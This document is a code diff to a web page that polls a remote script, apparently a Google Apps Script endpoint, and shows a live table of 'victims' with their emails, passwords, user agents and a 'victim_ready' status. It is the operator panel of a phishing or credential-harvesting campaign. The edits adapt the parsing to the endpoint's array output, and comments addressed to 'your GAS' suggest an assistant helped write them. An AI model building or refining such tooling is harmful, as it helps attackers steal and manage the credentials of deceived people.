@@ -128,7 +128,7 @@
 
         const text = await res.text();
 
-        // Show raw response no matter what
+        // Always show raw response (this helps you see exactly what comes back)
         rawEl.innerHTML = `<strong>Raw response from script:</strong><br>${escapeHtml(text || '(empty response)')}`;
 
         if (!text.trim()) {
@@ -140,18 +140,38 @@
         try {
           data = JSON.parse(text);
         } catch (e) {
-          // Not valid JSON → show what we have anyway
           showRawAsFallback(text);
           return;
         }
 
-        // Try common field patterns
-        const victims = data.victims || data.entries || data.data || data || [];
+        // ────────────────────────────────────────────────
+        // ADAPTED EXTRACTION – matches your GAS direct array response
+        // ────────────────────────────────────────────────
+        let victims = [];
 
-        if (Array.isArray(victims) && victims.length > 0) {
-          renderVictims(victims);
+        if (Array.isArray(data)) {
+          // Your GAS returns a direct array → this is the main match
+          victims = data;
+        } else if (data && Array.isArray(data.victims)) {
+          victims = data.victims;
+        } else if (data && typeof data === 'object') {
+          // Fallback: find any array in the object
+          victims = Object.values(data).find(Array.isArray) || [];
+        }
+
+        if (victims.length > 0) {
+          // Map fields to match table columns (your GAS uses "user_agent", not "userAgent")
+          const mappedVictims = victims.map(item => ({
+            timestamp: item.timestamp || '—',
+            email:     item.email     || '—',
+            status:    'victim_ready', // all rows here are ready ones
+            userAgent: item.user_agent || item.userAgent || '—',
+            password:  '—'             // not included in this endpoint
+          }));
+
+          renderVictims(mappedVictims);
         } else {
-          showEmpty("No victims found in response");
+          showEmpty("No victims ready in response");
         }
 
       } catch (err) {
@@ -167,11 +187,11 @@
       items.forEach(item => {
         const tr = document.createElement('tr');
         tr.innerHTML = `
-          <td>${escapeHtml(item.timestamp || item.time || '—')}</td>
-          <td>${escapeHtml(item.email || '—')}</td>
-          <td>${escapeHtml(item.status || item.Stat || '—')}</td>
-          <td title="${escapeHtml(item.userAgent || '')}">${escapeHtml((item.userAgent || '—').slice(0,70))}</td>
-          <td>${escapeHtml(item.password || item.pass || '—')}</td>
+          <td>${escapeHtml(item.timestamp)}</td>
+          <td>${escapeHtml(item.email)}</td>
+          <td>${escapeHtml(item.status)}</td>
+          <td title="${escapeHtml(item.userAgent)}">${escapeHtml(item.userAgent.slice(0,70))}${item.userAgent.length > 70 ? '...' : ''}</td>
+          <td>${escapeHtml(item.password)}</td>
         `;
         tbodyEl.appendChild(tr);
       });
@@ -206,7 +226,7 @@
         .replace(/'/g, "&#039;");
     }
 
-    // Start
+    // Start polling
     fetchVictims();
     setInterval(fetchVictims, 5000);
   </script>
@@ -214,4 +234,3 @@
 </html>
 
 
-    
